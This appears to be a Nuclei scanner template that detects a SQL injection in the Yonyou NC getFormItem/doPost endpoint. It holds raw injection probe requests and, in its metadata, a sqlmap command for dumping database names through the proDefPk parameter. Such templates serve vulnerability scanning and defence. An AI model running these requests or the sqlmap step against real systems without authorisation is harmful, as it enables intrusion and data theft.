id: yonyou-nc-doPost-sqli
info:
  name: 用友NC getFormItem doPost SQL注入
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://github.com/Ice-001/wxvuln/blob/8e5dbf87372de410b9530ecbdd53f683d1298544/doc/2025-07/2025-W28/2025-07-08/%E7%94%A8%E5%8F%8BNC%E6%9C%80%E6%96%B0SQL%E6%B3%A8%E5%85%A5%20%20CNVD-2025-06710%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips: sqlmap.py -r sqli.txt --dbms=oracle --dbs -p proDefPk
    repair:
    version:
  tags: yonyou,nc,sqli

http:
  - raw:
      - |
        POST /portal/pt/servlet/getFormItem/doPost?pageId=login&clazz=nc.uap.wfm.vo.base.ProDefBaseVO&proDefPk=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Length: 19

      - |+
        POST /portal/pt/servlet/getFormItem/doPost?pageId=login&clazz=nc.uap.wfm.vo.base.ProDefBaseVO&proDefPk=1' HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Connection: keep-alive
        Accept-Encoding: gzip, deflate, br
        Content-Length: 0

    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 500
          - contains_all(body_2,'xml version')
        condition: and